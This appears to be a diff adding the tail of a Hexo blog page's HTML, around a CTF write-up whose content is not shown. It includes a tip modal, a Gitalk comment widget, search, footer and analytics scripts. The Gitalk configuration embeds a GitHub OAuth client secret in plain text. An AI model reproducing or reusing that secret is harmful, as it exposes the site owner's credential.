+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <!-- 
+                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
+                        -->
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <!-- 
+                        <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
+                        </div> 
+                -->
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '116343b4650fce4789b6',
+        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
+        repo: 'miaotony.github.io',
+        owner: 'miaotony',
+        admin: "miaotony",
+        id: '2021-05-24T22-30-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/05/24/CTF_2021RedHat/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/22.jpg" class="responsive-img" alt="CTF | 2021 红帽杯 WriteUp">
+                        
+                        <span class="card-title">CTF | 2021 红帽杯 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前段时间打了个红帽杯，不过这段时间比较忙一直没空整理。趁着今天摸鱼，就来复现几道题好了。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/05/17/CTF_2021NUAACTF_EasyXSS/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/2.jpg" class="responsive-img" alt="CTF | 2021 NUAACTF Easy_XSS 复现">
+                        
+                        <span class="card-title">CTF | 2021 NUAACTF Easy_XSS 复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            在NUAACTF 2021中，有一道XSS相关的题目，主要涉及XSS绕过、PHP代码审计、文件上传绕过，难度其实还好。最近摸鱼，就来复现一下吧。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: MiaoTony&#39;s小窝<br />'
+            + '文章作者: MiaoTony<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('1'),
+            headingSelector: 'h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+        <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <a href="/about" target="_blank">MiaoTony</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">207.9k</span>&nbsp;字
+                                                                                    <span id="busuanzi_container_site_pv">
+			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+                                    <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+                        <br>
+                        <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "11";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+                        <br>
+                    </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
+        <i class="fab fa-telegram"></i>
+    </a>
+
+
+
+    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>
+
+    
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
